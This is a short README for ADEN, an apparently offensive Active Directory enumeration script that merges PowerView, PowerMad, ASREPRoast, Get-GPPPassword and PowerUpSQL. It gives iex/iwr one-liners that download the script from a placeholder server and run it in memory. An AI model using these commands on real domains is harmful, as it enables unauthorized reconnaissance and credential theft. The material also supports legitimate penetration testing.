## What is this?
ADEN is a local enumeration script for active directory environments, it is a carefully put together merge of several enumeration and exploitation projects:

- PowerView
- PowerMad
- ASREPRoast
- Get-GPPPassword
- PowerUpSQL


It is to be used as an all-in-one enumeration script to use when you are in a domain user's session.\
\
Big credits to all the authors of the above mentioned tools! You are awesome.

## How to use?
If you are not a local admin in the domain, the function ```Invoke-FullEnum``` is the recommended option as it will launch a full enumeration that will allow you to map the environment.\
\
From a local admin user, the function ```Invoke-AdminEnum``` is recommended as it will launch only the relevant enumeration checks for local admins.
```powershell
iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-FullEnum
iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-AdminEnum
```
Keep in mind you also have access to all the functions of the above mentioned scripts. 
